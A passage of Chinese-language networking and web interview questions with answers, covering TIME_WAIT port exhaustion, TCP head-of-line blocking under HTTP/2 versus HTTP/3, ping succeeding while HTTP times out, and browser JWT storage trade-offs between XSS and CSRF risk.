TIME_WAIT 出现在主动关闭的那一方。一台做大量短连接的服务器（例如过于激进地关掉 HTTP keep-alive，或自己充当关闭方）会让它们越堆越多，把临时端口（ephemeral port）耗尽。解法：开启 keep-alive / 连接池以复用连接、改让客户端来关闭、为出站连接调优 tcp_tw_reuse —— 但别一上来就把 TIME_WAIT 砍掉，它的存在是为了正确性。
HTTP/2 已经多路复用了，为什么一个丢包还是会拖累全局？HTTP/3 又是怎么改善的？ 困难
HTTP/2 消除了应用层队头阻塞，但它的所有流仍然挤在同一条 TCP 连接上。TCP 保证字节按序到达，所以单个丢包会让内核把每一条流的数据都先压着，直到它被重传 —— 这就是 TCP 层队头阻塞。HTTP/3 跑在 QUIC（基于 UDP）之上，按流各自跟踪丢包，所以一条流的丢包不会卡住其他流。
能 ping 通服务器，HTTP 却超时。怎么回事？ 热身
ping 用的是 ICMP；HTTP 用的是 TCP 80/443 端口 —— 两套不同的协议。所以主机是活着、可路由的，但可能是：Web 进程挂了、防火墙拦了那个 TCP 端口（却放行 ICMP）、端口配错了，或者 TCP 握手 / 应用本身卡住了。可达性 ≠ 服务可用性。
JWT 在浏览器里该存哪儿，为什么？ 中等
没有完美的地方。localStorage 简单，但任何 XSS 都能偷走令牌。HttpOnly Cookie 让 JS 读不到（对 XSS 更好），但会被自动发送，所以你必须加上 CSRF 防护（SameSite + 令牌）。一个常见答案：短有效期的访问令牌放内存里 + 刷新令牌放 HttpOnly、SameSite 的 Cookie 里。真正的解法，是从源头上防住 XSS。
